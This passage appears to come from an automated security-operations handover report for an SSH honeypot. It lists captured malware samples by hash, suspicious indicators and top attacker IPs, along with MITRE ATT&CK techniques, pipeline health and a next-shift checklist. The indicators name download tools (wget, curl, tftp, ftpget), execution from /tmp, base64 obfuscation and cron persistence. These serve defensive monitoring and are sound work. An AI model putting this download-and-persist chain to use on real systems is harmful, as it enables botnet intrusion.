| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `117.248.201[.]39` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 8 |
| `125.25.183[.]157` | TH | TOT Public Company Limited Bangkok | **100** ⚠️ | 50 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `66.132.224[.]236` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `168.110.102[.]254` | KR | Oracle Corporation | **100** ⚠️ | 3 |
| `1.247.245[.]61` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `101.13.4[.]119` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `115.84.178[.]56` | VN | Viettel-CHT Company Ltd | **100** ⚠️ | 18 |
| `221.199.172[.]66` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `2.57.122[.]168` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 179 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 171 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 97 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 95 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 95 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 289 cases |
| Tool 34  | Credential Extractor        | ✅ 183 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 29 recon entry/entries in table (12 group(s) consolidating 92 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-02T06:38:19Z_
